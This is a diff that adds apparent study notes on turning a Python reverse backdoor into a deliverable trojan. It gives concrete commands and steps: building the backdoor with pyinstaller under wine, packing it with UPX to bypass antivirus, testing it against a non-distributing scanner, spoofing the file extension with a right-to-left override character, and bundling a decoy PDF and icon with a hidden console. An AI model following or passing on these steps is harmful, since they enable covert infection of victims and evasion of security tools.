@@ -9,3 +9,22 @@
 4: wine python -m pip install pyinstaller
 5: Installs library in file python victim
 6: wine pyinstaller.exe reverse_backdoor.py --onefile --noconsole
+
+# Bypassing Anti-Virus Programs - Practical
+https://spyralscanner.net/
+https://github.com/upx/upx/releases/
+https://nodistribute.com/
+    ## Tutorial
+    Download https://github.com/upx/upx/releases/
+    Extract, rename folder to upx and move to opt in linux
+    cd /opt/upx
+    run: ./upx ../reverse_backdoor/dist/reverse_backdoor.exe -o compressed_backdoor.exe
+    Forware compressed_backdoor.exe to check https://nodistribute.com/
+
+# Spoofing File Extension
+    Kali -> search key "Right-to-left" and copy character
+    set name ...fdp.exe
+    copy name and replace name program of victim
+
+# Create Trojan
+wine pyinstaller.exe --add-data "/../../fileopen_replace.pdf;." --onefile --noconsole --icon /../pdf-icon.ico reverse_backdoor.py
